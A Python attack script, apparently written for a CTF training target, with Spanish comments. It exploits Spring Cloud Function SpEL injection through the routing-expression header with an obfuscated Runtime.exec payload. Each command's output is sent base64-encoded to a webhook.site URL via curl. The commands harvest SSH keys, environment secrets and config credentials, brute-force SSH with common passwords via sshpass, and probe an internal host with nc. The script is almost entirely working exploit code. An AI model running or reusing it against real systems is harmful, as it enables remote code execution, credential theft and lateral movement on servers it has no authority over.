#!/usr/bin/env python3
"""
CTF Chile - Ataque SSH y búsqueda de credenciales
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Buscando credenciales SSH...")

# Buscar claves SSH existentes
probe("ssh_keys", "find /root -name '*ssh*' -o -name '*rsa*' -o -name '*dsa*' 2>/dev/null | xargs ls -la")
probe("ssh_known_hosts", "cat /root/.ssh/known_hosts 2>/dev/null || echo 'No known_hosts'")

# Buscar credenciales en variables de entorno
probe("env_secrets", "env | grep -i 'pass\\|key\\|secret\\|token\\|ssh'")

# Buscar archivos de configuración con credenciales
probe("config_files", "find /app /root -name '*.conf' -o -name '*.cfg' -o -name '.env' 2>/dev/null | xargs cat 2>/dev/null | grep -i 'user\\|pass\\|ssh'")

print("[*] Probando credenciales comunes SSH...")

# Lista de credenciales comunes para CTF
common_creds = [
    "root:root", "root:password", "root:admin", "root:toor",
    "admin:admin", "admin:password", "admin:root",
    "user:user", "user:password", "user:admin",
    "ubuntu:ubuntu", "ubuntu:password",
    "ctf:ctf", "flag:flag", "vault:vault"
]

for i, cred in enumerate(common_creds[:8]):  # Probar primeros 8
    user, password = cred.split(":")
    probe(f"ssh_try_{i+1}_{user}", f"timeout 8 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@10.160.209.1 'id && hostname && pwd' 2>/dev/null || echo 'AUTH_FAILED_{user}:{password}'")

print("[*] Buscando archivos de configuración SSH...")
probe("ssh_config", "cat /etc/ssh/ssh_config 2>/dev/null | head -20")

# Probar acceso sin contraseña
probe("ssh_no_auth", "timeout 5 ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=no -o ConnectTimeout=3 root@10.160.209.1 'echo SUCCESS' 2>/dev/null || echo 'NO_KEY_AUTH'")

print("[*] Explorando otros métodos...")

# Buscar si hay algún túnel o proxy configurado
probe("netcat_test", "timeout 3 echo 'test' | nc 10.160.209.1 22 && echo 'NC_SUCCESS'")

# Buscar archivos con información de red
probe("network_config", "cat /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v '^#'")

time.sleep(12)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

successful_login = None

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar login SSH exitoso
            if "uid=" in decoded and "gid=" in decoded and "AUTH_FAILED" not in decoded:
                successful_login = path
                print("🔑 LOGIN SSH EXITOSO DETECTADO!")

            # Buscar claves SSH
            if "BEGIN" in decoded and ("RSA" in decoded or "OPENSSH" in decoded):
                print("🔐 Clave SSH encontrada")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if successful_login:
    print(f"\n🎉 LOGIN EXITOSO DETECTADO EN: {successful_login}")
else:
    print("\n[*] No se detectaron logins exitosos - puede requerir un enfoque diferente")